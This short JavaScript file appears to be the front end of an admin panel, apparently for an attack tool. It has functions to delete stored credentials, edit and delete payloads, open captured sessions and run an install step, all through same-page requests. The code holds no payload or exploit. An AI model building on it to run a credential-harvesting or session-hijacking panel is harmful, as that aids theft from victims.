function _active(t){
	var menu = document.getElementById('menu');
	var item = document.getElementById('item');
	var menu_li = menu.getElementsByTagName('li');
	var item_div = item.getElementsByTagName('div');
	var l = menu_li.length;
	for(i=0;i<l;i++){
		menu_li[i].index = i;
		menu_li[i].className = "";
		item_div[i].className = "hide";
	}
	t.className = "act";
	item_div[t.index].className = ""
}

function delCred(id){
	if( confirm("delete?") ){
		var xmlhttp;
		if (window.XMLHttpRequest){
		  xmlhttp=new XMLHttpRequest();
		}else{
		  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		var delCred = "?delCred="+id;
		xmlhttp.open("GET",delCred,true);
		xmlhttp.send();
		refresh()
	}
}

function delPayload(id){
	if( confirm("del payload?") ){
		var xmlhttp;
		if (window.XMLHttpRequest){
		  xmlhttp=new XMLHttpRequest();
		}else{
		  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		var delPayload = "?delPayload="+id;
		xmlhttp.open("GET",delPayload,true);
		xmlhttp.send();
		refresh();
	}
}

function clipe(obj){
	alert(obj);
	window.clipboardData.setData("Text",content);
}

function install(){
	if( confirm( "install?" ) ){
		location.href="?install";
	}
}

function refresh(){
	location.href=location.href
}

function editPayload(id){
	window.open("?editPayload="+id,"","height=450,width=500,scrollbars=yes,status =yes");
}

function openSession(id){
	window.open("?open="+id)
}

//setTimeout("refresh()",5000);
